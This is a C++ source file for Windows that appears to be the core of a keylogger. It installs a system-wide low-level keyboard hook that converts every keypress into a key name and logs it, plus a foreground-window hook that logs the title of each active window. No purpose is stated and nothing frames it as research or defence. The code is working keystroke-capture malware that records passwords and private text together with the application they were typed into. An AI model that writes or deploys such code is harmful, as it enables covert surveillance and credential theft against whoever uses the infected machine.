#include "winkey.hpp"

// Define the keyboard event hook 
LRESULT CALLBACK handle_keyboard_event(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        char key_name[256] = { 0 };

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // std::cout << std::hex << "Key down - Virtual Key Code: 0x" << pKbStruct->vkCode << std::dec << std::endl;

            memset(key_name, 0, sizeof(key_name));
            LONG dwMsg = 1;
            dwMsg += pKbStruct->scanCode << 16;
            dwMsg += pKbStruct->flags << 24;
            if (GetKeyNameTextA(dwMsg, key_name, sizeof(key_name) - 1)) {
                std::cout << key_name;
                log_keystroke(key_name);
            }
            else {
                std::cout << "Last error: " << GetLastError() << std::endl;
            }
        }
    }
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

// Define the windows event hook
void CALLBACK handle_windows_event(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hwnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime
) {
    (void)hWinEventHook, event, hwnd, idObject, idChild, idEventThread, dwmsEventTime;
    char window_title[256];
    memset(window_title, 0, sizeof(window_title));
    GetWindowText(hwnd, window_title, sizeof(window_title));
    log_window_title(window_title);
}

int install_windows_hook() {
    // Install the WinEvent hook for tracking foreground window changes
    g_windows_hook =
        SetWinEventHook(
            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Range of events (0x3 to 0x3).
            NULL,                                               // Handle to DLL.
            handle_windows_event,                               // The callback.
            0, 0,                                               // Process and thread IDs of interest (0 = all)
            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags.
    
    if (g_windows_hook == NULL) {
        std::cerr << "Failed to install windows hook." << std::endl;
        return 0;
    }

    std::cout << "Windows hook installed." << std::endl;
    return 1;
}

int install_keyboard_hook() {
    // Install the low-level keyboard hook for tracking keyboard events
    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, handle_keyboard_event, NULL, 0);

    if (g_keyboard_hook == NULL) {
        std::cerr << "Failed to install keyboard hook." << std::endl;
        return 0;
    }

    std::cout << "Keyboard hook installed." << std::endl;
    return 1;
}
